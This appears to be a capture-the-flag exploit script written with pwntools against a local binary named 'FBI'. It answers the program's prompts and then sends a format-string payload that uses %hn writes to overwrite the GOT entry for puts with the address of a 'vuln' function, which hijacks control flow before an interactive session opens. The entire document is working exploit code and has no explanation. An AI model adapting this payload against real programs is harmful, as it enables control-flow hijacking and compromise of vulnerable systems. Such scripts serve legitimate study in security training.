from pwn import*
context.log_level = 'debug'

p = process("./FBI")
e = ELF("./FBI")
vuln = 0x080493bf

vuln_front = 0x0804
vuln_back = 0x93bf

puts_got = e.got['puts']
log.info("put_got:" + hex(puts_got))
 
p.recvuntil(b"Answer Y or N.\n")

answer = 'y'
p.sendline(answer.encode())
p.recvuntil(b"Do you hear me?\n")

pay = p32(puts_got+2)
pay += p32(puts_got)
pay += b"%" + str(int(vuln_front -8)).encode() + b"c" + b"%1$hn" 
pay += b"%" + str(int(vuln_back - vuln_front)).encode() + b"c" + b"%2$hn"
p.sendline(pay) 

p.interactive()
